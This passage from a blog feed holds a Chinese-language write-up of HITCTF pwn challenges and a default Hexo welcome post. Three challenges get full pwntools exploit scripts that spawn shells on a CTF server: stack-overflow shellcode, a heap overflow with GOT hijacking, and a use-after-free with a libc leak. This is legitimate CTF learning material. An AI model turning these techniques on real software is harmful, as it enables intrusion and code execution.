log.progress(<span class="string">'go'</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">            pro.status(<span class="string">'boom for '</span>+chr(j))</span><br><span class="line">            <span class="comment">#tmp = ''</span></span><br><span class="line">            tmp = login(j)</span><br><span class="line">            <span class="comment">#print tmp</span></span><br><span class="line">            <span class="keyword">if</span> tmp!=<span class="string">'00'</span>:</span><br><span class="line">                password = password + tmp</span><br><span class="line">                pro.success(<span class="string">': is '</span>+password)</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'password is '</span>,password</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">password = <span class="string">''</span></span><br><span class="line">boom()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><hr><h1 id="DragonBall"><a href="#DragonBall" class="headerlink" title="DragonBall"></a>DragonBall</h1><p>程序大意是 手中共有15个金币， 购买一个龙珠需要5金币，出售一个龙珠3金币，当集齐7颗龙珠以后就能实现愿望了（wish()）。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>wish()函数中有明显的溢出漏洞，但是很不充分，溢出仅能覆盖返回地址和EBP，如果单纯写rop很难，除非有很好的跳板，但是并没有发现jmp xxx的跳板，一度陷入僵局…</p><p><img src="/img/HITCTF/pwn_3_1.png" alt=""></p><p>突然想起查了一下保护开启情况，发现没有开NX保护，也就是说可以执行shellcode…</p><p><img src="/img/HITCTF/pwn_3_2.png" alt=""></p><p>就是说可以在第一块内写入execve(‘/bin/sh’)的shellcode，然后覆盖返回地址去执行，仅需知道该处的地址即可，需要泄露栈地址，此处可以从第一处写入部分去泄露，泄露wish()的ebp地址，即可得到shellcode起始位置的地址了。</p><h2 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h2><p>漏洞在于buy()中，仅检测是否money!=0的情况，也就是说构造一个money不为5的倍数即可无限制购买，很显然可以先买一个再卖出，就剩余13个金币，无论如何都不可能为0，因此可以无限制购买龙珠，最后达成愿望。</p><p><img src="/img/HITCTF/pwn_3_3.png" alt=""></p><p>最终，利用脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./DragonBall'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p = process(<span class="string">'./DragonBall'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'111.230.132.82'</span>, <span class="number">40002</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'You choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'You choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">p.recvuntil(<span class="string">'You choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'You choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Tell me your wish: '</span>)</span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line">payload = payload.ljust(<span class="number">0x66</span>,<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload+<span class="string">'b'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'ab'</span>)</span><br><span class="line">stack_leak = u32(p.recv(<span class="number">5</span>)[<span class="number">1</span>:])</span><br><span class="line"><span class="keyword">print</span> <span class="string">'stack_leak : '</span>,hex(stack_leak)</span><br><span class="line">offset = <span class="number">0xffa7cc48</span><span class="number">-0xffa7cbc0</span></span><br><span class="line">payload_addr = stack_leak - offset</span><br><span class="line"><span class="keyword">print</span> <span class="string">'shellcode : '</span>,hex(payload_addr)</span><br><span class="line">p.recvuntil(<span class="string">'is it right?\n(Y/N) '</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">0x38</span>+p32(stack_leak)+p32(payload_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><hr><h1 id="notes"><a href="#notes" class="headerlink" title="notes"></a>notes</h1><p>程序的大概内容是程序维护这一个链表，链表各块使用malloc分配，大小为0x38（56）个字节，最开始四字节是一个unsigned int，命名为value，相当于一个索引，之后的48个字节为data，最后四字节为下一个块的地址。</p><p>程序利用value值遍历这个链表，找到这个链表的第一个value相同的项进行修改。</p><p>在这期间没有任何溢出问题。</p><h2 id="漏洞位置"><a href="#漏洞位置" class="headerlink" title="漏洞位置"></a>漏洞位置</h2><p>漏洞出现的原因有2点</p><ol><li>程序利用bss段上的某一个值对data长度进行限定,初始值为48</li><li>程序输出是先用sprintf函数拷贝到bss段上某一个位置，在用puts进行打印，而由于该缓存字符串的长度限定有问题，在建立了100个字节以上的节点时，会出现溢出现象，而溢出的点恰好为1中提到的data长度，将其覆盖成为字符’s’，也就是115，进一步造成了堆溢出。</li></ol><p><img src="/img/HITCTF/pwn_4_1.png" alt=""></p><p><img src="/img/HITCTF/pwn_4_2.png" alt=""></p><h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>漏洞利用思路是首先构造100个节点，造成堆溢出，此时可以的输入可以覆盖到下一块的地址部分，也就是说可以劫持链表，利用程序功能造成内存任意读写。</p><ol><li>首先将某数据库的下一块地址覆盖为puts@got地址，这样利用打印功能可以泄露libc的puts函数地址。</li><li>再对该块进行写操作，利用的索引即是泄露的puts地址，因为该块已经在链表中了，将该块地址覆写为一个one_gadget地址，最终利用puts函数的调用触发，即劫持got表。</li></ol><p>利用脚本如下：（io貌似还有点问题没有解决）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./nodes'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./nodes'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'111.230.132.82'</span>, <span class="number">40003</span>)</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(value,data)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'please input your choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Value:'</span>)</span><br><span class="line">    p.send(str(value)+<span class="string">'\0'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Data:'</span>)</span><br><span class="line">    p.sendline(<span class="string">''</span>)</span><br><span class="line">    <span class="comment">#time.sleep()</span></span><br><span class="line">    p.recvuntil(<span class="string">'nodes\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#def change</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">103</span>):</span><br><span class="line">    add(i,<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'please input your choice:'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'please input your choice:'</span>)</span><br><span class="line">p.sendline(<span class="string">'2\0'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Node\'s value:'</span>)</span><br><span class="line">p.sendline(<span class="string">'101'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'New value:'</span>)</span><br><span class="line">p.sendline(<span class="string">'101'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'New data:'</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">48</span>+p32(elf.got[<span class="string">'puts'</span>]))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'please input your choice:'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Value:101\n'</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">a = p.recvline()</span><br><span class="line">puts_addr = int(a[<span class="number">6</span>:<span class="number">-1</span>],<span class="number">10</span>)</span><br><span class="line">libc.address = puts_addr - libc.symbols[<span class="string">'puts'</span>] </span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]puts addr:'</span>,hex(puts_addr)</span><br><span class="line">p.recvuntil(<span class="string">'please input your choice:'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Node\'s value:'</span>)</span><br><span class="line">p.sendline(a[<span class="number">6</span>:<span class="number">-1</span>])</span><br><span class="line">p.recvuntil(<span class="string">'New value:'</span>)</span><br><span class="line">p.sendline(str(libc.address+<span class="number">0x3ac5c</span>))</span><br><span class="line">p.recvuntil(<span class="string">'New data:'</span>)</span><br><span class="line">p.sendline(<span class="string">''</span>)</span><br><span class="line">p.recvuntil(<span class="string">'choice:'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x3ac5c execve("/bin/sh", esp+0x28, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  esi is the GOT address of libc</span></span><br><span class="line"><span class="string">  [esp+0x28] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x3ac5e execve("/bin/sh", esp+0x2c, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  esi is the GOT address of libc</span></span><br><span class="line"><span class="string">  [esp+0x2c] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x3ac62 execve("/bin/sh", esp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  esi is the GOT address of libc</span></span><br><span class="line"><span class="string">  [esp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x3ac69 execve("/bin/sh", esp+0x34, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  esi is the GOT address of libc</span></span><br><span class="line"><span class="string">  [esp+0x34] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x5fbc5 execl("/bin/sh", eax)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  esi is the GOT address of libc</span></span><br><span class="line"><span class="string">  eax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x5fbc6 execl("/bin/sh", [esp])</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  esi is the GOT address of libc</span></span><br><span class="line"><span class="string">  [esp] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h1 id="babynote"><a href="#babynote" class="headerlink" title="babynote"></a>babynote</h1><p>一道比较典型的UAF漏洞。</p><h2 id="逻辑分析"><a href="#逻辑分析" class="headerlink" title="逻辑分析"></a>逻辑分析</h2><p>程序逻辑是一个可以任意输入的note，每一个note分为了两部分：block和content</p><p>block的结构为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|  size（int）    |      content address    |    function ptr    | </span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><p>content的大小为size值</p><p>add函数中详细的为每一个变量赋值，尤其是function ptr，初始值为某自实现的puts函数</p><p><img src="/img/HITCTF/pwn_5_2.png" alt=""></p><p>print函数中显示了调用function ptr函数的参数和方法，可以想到如果可以劫持function ptr就可以执行任意命令</p><p><img src="/img/HITCTF/pwn_5_3.png" alt=""></p><p>在程序中要求最多可以生成3个note，分别存储在bss段上的一个数组内</p><p><img src="/img/HITCTF/pwn_5_1.png" alt=""></p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>显然，由于在edit的时候并没有检查堆块是否已经被释放，因此，存在明显的UAF(Use After Free)漏洞。</p><p>而且删除堆块时程序的释放顺序是先释放content，再释放block，由于fastbin的LIFO性质，可以明显知道</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add（0xc，&apos;p4nda&apos;）</span><br><span class="line">delete(0)</span><br><span class="line">add(0xc,&apos;p4nda&apos;)</span><br></pre></td></tr></table></figure><p>使用的堆块是不变的，因此想要用分配得到的content控制一个note的block，进而控制function ptr的方法必须让堆块分配不平衡。</p><p>比如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(0x100,&apos;p4nda&apos;)</span><br><span class="line">add(0xc,&apos;p4nda&apos;)</span><br><span class="line">delete(1)</span><br><span class="line">delete(0)</span><br><span class="line">add(0xc,payload)</span><br></pre></td></tr></table></figure><p>这样分配，可以导致第0个note的block分配给第2个note的block，而第1个note的block会分配给第二个note作为content，是可以编辑的，进一步可以劫持控制流。</p><h2 id="地址泄露"><a href="#地址泄露" class="headerlink" title="地址泄露"></a>地址泄露</h2><p>此题开启了PIE保护，不可以使用题目文件中的固定地址了。同时需要利用获取system地址，来得到shell，因此泄露一个libc地址是很必要的。</p><p>这时存在一个堆块分配与释放的机制问题，堆块在libc的内存管理中主要分fastbin、unsorted bin、 small bin、large bin、top、mmap来管理，其中fastbin管理的是较小堆块，当内存小于global_max_fast值时，在内存释放时会挂载到fastbin中，而稍大一些的small bin、large bin在释放时，当不与top头相邻，会先挂载到unsorted bin中去。</p><p>而如何寻找到各个bin的地址？libc在bss段上设置了一个结构体变量叫 main_arena，变量的各个成员就是每个bin的开头，如图</p><p><img src="/img/HITCTF/pwn_5_5.png" alt=""></p><p>在libc符号表中，没有main<em>arena的符号，但该地址与\</em>_malloc<em>hook很近，通常利用 \</em>_mall_hook来定位main_arena</p><p><img src="/img/HITCTF/pwn_5_6.png" alt=""></p><p>在各个bin链表中，不同的链表有不同的组织方式，如fastbin是单链表，unsorted bin、small bin是双链表，largebin更为复杂。因此，常用的地址泄露的方式是从unsorted bin泄露，当可以任意读取unsorted bin数据时，堆块的fd位置即为main_arena中unsorted bin地址。</p><p>如在此题中就可以用这种方式泄露</p><p><img src="/img/HITCTF/pwn_5_7.png" alt=""></p><h2 id="劫持控制流"><a href="#劫持控制流" class="headerlink" title="劫持控制流"></a>劫持控制流</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(0x100,&apos;p4nda&apos;)</span><br><span class="line">add(0xc,&apos;p4nda&apos;)</span><br><span class="line">delete(1)</span><br><span class="line">delete(0)</span><br><span class="line">add(0xc,payload)</span><br></pre></td></tr></table></figure><p>当按上述方法控制了第1块的block时，修改payload即可完成对控制流的劫持，如利用泄露的libc地址获取system()地址，将其覆盖到function ptr时，在将size覆盖成 sh\x00\x00，利用print(1)进行触发即可获得一个shell</p><pre><code>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| &apos;sh\0\0&apos;    |     anything     |    system address    | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</code></pre><p>利用脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./babynote'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p = process(<span class="string">'./babynote'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'111.230.132.82'</span>, <span class="number">40004</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'size:'</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(<span class="string">'content'</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_note</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'p4nda'</span>)</span><br><span class="line">add(<span class="number">0xc</span>,<span class="string">'p4nda'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">print_note(<span class="number">0</span>)</span><br><span class="line">libc_leak_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc.address = libc_leak_addr - libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-48</span><span class="number">-0x18</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] system :'</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">add(<span class="number">0xc</span>,<span class="string">'sh\0\0'</span>+p32(next(libc.search(<span class="string">'/bin/sh'</span>)))+p32(libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line">print_note(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><a href="/img/HITCTF/HITCTF.zip">题目</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;HITCTF是哈尔滨工业大学组织的一场校赛，在假期时间看了一下题目，锻炼一下，以此记录。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/HITCTF/logo.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;本次比赛共有五道PWN题：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;stackoverfl
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://p4nda.top/2018/01/23/hello-world/"/>
    <id>http://p4nda.top/2018/01/23/hello-world/</id>
    <published>2018-01-22T16:34:14.000Z</published>
    <updated>2018-01-24T13:04:46.446Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
      
    
    </summary>
    
    
      <category term="hello" scheme="http://p4nda.top/tags/hello/"/>
    
      <category term="world" scheme="http://p4nda.top/tags/world/"/>
    
  </entry>
  
</feed>
